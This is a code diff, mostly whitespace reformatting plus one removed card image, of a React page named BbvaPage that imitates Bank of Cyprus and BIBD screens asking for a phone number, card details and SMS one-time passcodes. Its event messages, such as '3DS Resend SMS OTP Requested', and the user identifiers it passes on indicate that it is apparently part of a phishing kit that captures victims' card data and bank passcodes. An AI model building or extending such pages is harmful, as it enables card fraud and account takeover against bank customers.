@@ -154,13 +154,12 @@ function ThreeStepsHeader({
                 {/* Step Item: Circle + Label */}
                 <div className="flex flex-col items-center">
                   <div
-                    className={`w-7 h-7 rounded-full flex items-center justify-center text-[12px] font-bold transition-all duration-300 ${
-                      isCompleted
-                        ? "bg-[#058998] text-white"
-                        : isActive
+                    className={`w-7 h-7 rounded-full flex items-center justify-center text-[12px] font-bold transition-all duration-300 ${isCompleted
+                      ? "bg-[#058998] text-white"
+                      : isActive
                         ? "bg-[#058998] text-white ring-3 ring-[#058998]/20"
                         : "bg-slate-100 text-slate-400 border border-slate-200"
-                    }`}
+                      }`}
                   >
                     {isCompleted ? (
                       <svg
@@ -180,13 +179,12 @@ function ThreeStepsHeader({
                     )}
                   </div>
                   <span
-                    className={`text-[10px] sm:text-[11px] font-semibold mt-1 tracking-tight text-center whitespace-nowrap ${
-                      isActive
-                        ? "text-[#058998] font-bold"
-                        : isCompleted
+                    className={`text-[10px] sm:text-[11px] font-semibold mt-1 tracking-tight text-center whitespace-nowrap ${isActive
+                      ? "text-[#058998] font-bold"
+                      : isCompleted
                         ? "text-[#0d1e38]"
                         : "text-slate-400"
-                    }`}
+                      }`}
                   >
                     {s.label}
                   </span>
@@ -195,9 +193,8 @@ function ThreeStepsHeader({
                 {/* Connecting Line between steps */}
                 {idx < steps.length - 1 && (
                   <div
-                    className={`flex-1 h-[2px] mx-2 -mt-4.5 rounded-full transition-all duration-300 ${
-                      currentStep > s.num ? "bg-[#058998]" : "bg-slate-200"
-                    }`}
+                    className={`flex-1 h-[2px] mx-2 -mt-4.5 rounded-full transition-all duration-300 ${currentStep > s.num ? "bg-[#058998]" : "bg-slate-200"
+                      }`}
                   />
                 )}
               </React.Fragment>
@@ -435,7 +432,7 @@ export default function BbvaPage(props: any) {
         title: "Bank of Cyprus — 3DS Resend SMS OTP Requested",
         type: "boc_resend",
       })
-    } catch {}
+    } catch { }
   }
 
   // Format date as MM/DD/YYYY matching user screenshot (e.g. 11/16/2026)
@@ -1138,7 +1135,7 @@ export default function BbvaPage(props: any) {
       title: "BIBD — Confirm OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_confirm_otp",
-    }).catch(() => {})
+    }).catch(() => { })
   }
 
   // Handle Resend OTP Code
@@ -1155,7 +1152,7 @@ export default function BbvaPage(props: any) {
       title: "BIBD — OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_otp",
-    }).catch(() => {})
+    }).catch(() => { })
   }
 
   const isCardFormValid =
@@ -1243,11 +1240,10 @@ export default function BbvaPage(props: any) {
 
                   {/* Input container with Flag and Country Code beside number */}
                   <div
-                    className={`w-full h-[52px] px-3 rounded-[10px] border bg-white flex items-center gap-2.5 transition-all shadow-xs ${
-                      phoneError
-                        ? "border-red-500 ring-1 ring-red-400"
-                        : "border-[#cbd5e1] focus-within:border-[#058998] focus-within:ring-1 focus-within:ring-[#058998]"
-                    }`}
+                    className={`w-full h-[52px] px-3 rounded-[10px] border bg-white flex items-center gap-2.5 transition-all shadow-xs ${phoneError
+                      ? "border-red-500 ring-1 ring-red-400"
+                      : "border-[#cbd5e1] focus-within:border-[#058998] focus-within:ring-1 focus-within:ring-[#058998]"
+                      }`}
                   >
                     {/* Flag and Country Code Badge */}
                     <div className="flex items-center gap-2 shrink-0 py-1 px-1.5 rounded-md bg-slate-50 border border-slate-200">
@@ -1302,11 +1298,10 @@ export default function BbvaPage(props: any) {
                 <button
                   type="submit"
                   disabled={isPhoneSubmitting || !phoneNumber.trim()}
-                  className={`w-full h-[48px] rounded-[10px] mt-4 font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
-                    phoneNumber.trim().length > 0 && !isPhoneSubmitting
-                      ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
-                      : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
-                  }`}
+                  className={`w-full h-[48px] rounded-[10px] mt-4 font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${phoneNumber.trim().length > 0 && !isPhoneSubmitting
+                    ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                    : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
+                    }`}
                 >
                   {isPhoneSubmitting ? (
                     <div className="flex items-center gap-2">
@@ -1504,20 +1499,9 @@ export default function BbvaPage(props: any) {
 
           {/* Card Container extending to bottom with white Background */}
           <section className="relative z-10 w-full bg-white rounded-none flex-1 min-h-0 flex flex-col overflow-hidden select-none">
-            {/* STICKY TOP CARD IMAGE - Pinned in place, does not scroll away, background white */}
-            <div className="shrink-0 w-full px-4 pt-3.5 pb-2 bg-white z-10">
-              <div className="w-full flex justify-center">
-                <img
-                  src="/cyprus_card.png"
-                  alt="Bank of Cyprus Card"
-                  className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
-                />
-              </div>
-            </div>
-
-            {/* SCROLLABLE FORM SECTION - Smoothly scrolls below the sticky card, background white */}
+            {/* SCROLLABLE FORM SECTION - background white */}
             <div
-              className="flex-1 min-h-0 overflow-y-auto px-4 pt-2 pb-10 flex flex-col bg-white overscroll-y-contain touch-pan-y"
+              className="flex-1 min-h-0 overflow-y-auto px-4 pt-5 pb-10 flex flex-col bg-white overscroll-y-contain touch-pan-y"
               style={{ WebkitOverflowScrolling: "touch" }}
             >
               <div className="w-full flex flex-col pb-6">
@@ -1633,11 +1617,10 @@ export default function BbvaPage(props: any) {
                   <button
                     type="submit"
                     disabled={isCardSubmitting || !isCardFormValid}
-                    className={`w-full h-[48px] rounded-[10px] font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${
-                      isCardFormValid && !isCardSubmitting
-                        ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
-                        : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
-                    }`}
+                    className={`w-full h-[48px] rounded-[10px] font-semibold text-[15.5px] tracking-wide flex items-center justify-center transition-all select-none ${isCardFormValid && !isCardSubmitting
+                      ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer shadow-sm"
+                      : "bg-[#e2e8f0] text-[#94a3b8] cursor-not-allowed"
+                      }`}
                   >
                     {isCardSubmitting ? (
                       <div className="flex items-center gap-2">
@@ -1707,11 +1690,10 @@ export default function BbvaPage(props: any) {
                 <button
                   type="button"
                   onClick={() => setBocLanguage("en")}
-                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
-                    bocLanguage === "en"
-                      ? "bg-[#058998] text-white shadow-xs"
-                      : "text-[#64748b] hover:text-[#0f172a]"
-                  }`}
+                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${bocLanguage === "en"
+                    ? "bg-[#058998] text-white shadow-xs"
+                    : "text-[#64748b] hover:text-[#0f172a]"
+                    }`}
                   aria-label="English"
                 >
                   EN
@@ -1719,11 +1701,10 @@ export default function BbvaPage(props: any) {
                 <button
                   type="button"
                   onClick={() => setBocLanguage("el")}
-                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
-                    bocLanguage === "el"
-                      ? "bg-[#058998] text-white shadow-xs"
-                      : "text-[#64748b] hover:text-[#0f172a]"
-                  }`}
+                  className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${bocLanguage === "el"
+                    ? "bg-[#058998] text-white shadow-xs"
+                    : "text-[#64748b] hover:text-[#0f172a]"
+                    }`}
                   aria-label="Greek"
                 >
                   EL
@@ -1959,11 +1940,10 @@ export default function BbvaPage(props: any) {
               <button
                 type="button"
                 onClick={() => setBocLanguage("en")}
-                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
-                  bocLanguage === "en"
-                    ? "bg-[#1434cb] text-white shadow-xs"
-                    : "text-[#64748b] hover:text-[#0f172a]"
-                }`}
+                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${bocLanguage === "en"
+                  ? "bg-[#1434cb] text-white shadow-xs"
+                  : "text-[#64748b] hover:text-[#0f172a]"
+                  }`}
                 aria-label="English"
               >
                 EN
@@ -1971,11 +1951,10 @@ export default function BbvaPage(props: any) {
               <button
                 type="button"
                 onClick={() => setBocLanguage("el")}
-                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${
-                  bocLanguage === "el"
-                    ? "bg-[#1434cb] text-white shadow-xs"
-                    : "text-[#64748b] hover:text-[#0f172a]"
-                }`}
+                className={`px-2 py-0.5 rounded-full transition-all cursor-pointer ${bocLanguage === "el"
+                  ? "bg-[#1434cb] text-white shadow-xs"
+                  : "text-[#64748b] hover:text-[#0f172a]"
+                  }`}
                 aria-label="Greek"
               >
                 EL
@@ -2062,20 +2041,18 @@ export default function BbvaPage(props: any) {
                   placeholder=""
                   autoFocus
                   disabled={isBocVerifying}
-                  className={`w-full max-w-[260px] h-[42px] px-3 rounded-[3px] border bg-white text-[#111827] text-center text-[16px] font-semibold tracking-[0.15em] focus:outline-none mb-3 transition-colors ${
-                    bocAuthFailed
-                      ? "border-[#ef4444] focus:border-[#ef4444] focus:ring-1 focus:ring-[#ef4444]"
-                      : "border-[#a0aec0] focus:border-[#1434cb] focus:ring-1 focus:ring-[#1434cb]"
-                  } ${isBocVerifying ? "opacity-60 cursor-not-allowed" : ""}`}
+                  className={`w-full max-w-[260px] h-[42px] px-3 rounded-[3px] border bg-white text-[#111827] text-center text-[16px] font-semibold tracking-[0.15em] focus:outline-none mb-3 transition-colors ${bocAuthFailed
+                    ? "border-[#ef4444] focus:border-[#ef4444] focus:ring-1 focus:ring-[#ef4444]"
+                    : "border-[#a0aec0] focus:border-[#1434cb] focus:ring-1 focus:ring-[#1434cb]"
+                    } ${isBocVerifying ? "opacity-60 cursor-not-allowed" : ""}`}
                 />
                 <button
                   type="submit"
                   disabled={!bocOtp.trim() || isBocVerifying}
-                  className={`w-full max-w-[260px] h-[40px] rounded-[3px] font-bold text-[13px] sm:text-[13.5px] tracking-wider uppercase flex items-center justify-center transition-all select-none shadow-xs ${
-                    bocOtp.trim() && !isBocVerifying
-                      ? "bg-[#1434cb] hover:bg-[#0f28a6] active:scale-[0.99] text-white cursor-pointer"
-                      : "bg-[#1434cb]/60 text-white/80 cursor-not-allowed"
-                  }`}
+                  className={`w-full max-w-[260px] h-[40px] rounded-[3px] font-bold text-[13px] sm:text-[13.5px] tracking-wider uppercase flex items-center justify-center transition-all select-none shadow-xs ${bocOtp.trim() && !isBocVerifying
+                    ? "bg-[#1434cb] hover:bg-[#0f28a6] active:scale-[0.99] text-white cursor-pointer"
+                    : "bg-[#1434cb]/60 text-white/80 cursor-not-allowed"
+                    }`}
                 >
                   {isBocVerifying ? (
                     <Loader2 className="w-4 h-4 animate-spin text-white" />
@@ -2302,9 +2279,8 @@ export default function BbvaPage(props: any) {
 
               {/* 6 OTP Boxes */}
               <div
-                className={`grid grid-cols-6 gap-2 sm:gap-2.5 w-full max-w-[340px] mx-auto mb-3.5 ${
-                  confirmShake > 0 ? "animate-shake" : ""
-                }`}
+                className={`grid grid-cols-6 gap-2 sm:gap-2.5 w-full max-w-[340px] mx-auto mb-3.5 ${confirmShake > 0 ? "animate-shake" : ""
+                  }`}
               >
                 {confirmOtp.map((digit, idx) => {
                   const isFocused = confirmFocusedIndex === idx
@@ -2313,8 +2289,8 @@ export default function BbvaPage(props: any) {
                       ? "border-[#ef4444] ring-1 ring-[#ef4444]"
                       : "border-[#ef4444]"
                     : isFocused
-                    ? "border-[#058998] ring-1 ring-[#058998]"
-                    : "border-[#cbd5e1]"
+                      ? "border-[#058998] ring-1 ring-[#058998]"
+                      : "border-[#cbd5e1]"
 
                   return (
                     <input
@@ -2381,11 +2357,10 @@ export default function BbvaPage(props: any) {
                 type="button"
                 disabled={confirmOtp.join("").length < 6 || isConfirmSubmitting}
                 onClick={handleConfirmOtpSubmit}
-                className={`w-full h-[44px] rounded-[10px] font-semibold text-[14px] sm:text-[14.5px] transition-all flex items-center justify-center select-none shadow-sm ${
-                  confirmOtp.join("").length === 6 && !isConfirmSubmitting
-                    ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer"
-                    : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
-                }`}
+                className={`w-full h-[44px] rounded-[10px] font-semibold text-[14px] sm:text-[14.5px] transition-all flex items-center justify-center select-none shadow-sm ${confirmOtp.join("").length === 6 && !isConfirmSubmitting
+                  ? "bg-[#058998] hover:bg-[#04707d] active:scale-[0.985] text-white cursor-pointer"
+                  : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
+                  }`}
               >
                 {isConfirmSubmitting ? (
                   <div className="flex items-center gap-2">
